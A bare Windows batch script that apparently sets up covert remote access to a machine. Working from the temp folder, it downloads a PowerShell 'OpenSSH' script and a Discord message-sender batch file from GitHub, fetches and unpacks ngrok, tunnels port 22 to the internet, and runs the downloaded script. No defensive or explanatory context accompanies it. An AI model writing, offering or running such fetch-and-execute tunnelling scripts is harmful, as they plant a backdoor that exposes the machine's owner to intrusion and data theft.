C:
cd %temp%

curl https://raw.githubusercontent.com/dh3b/MrSSH/main/SSH%20FIles/OpenSSH.ps1 -o ssh.ps1
curl https://raw.githubusercontent.com/agamsol/Batch-Projects/main/Discord-Message-Sender/Source.bat -o discordmsg.bat
curl https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip -o ngrok.zip
tar -xf ngrok.zip
ngrok.exe tcp 22 --region eu


powershell ./ssh.ps1
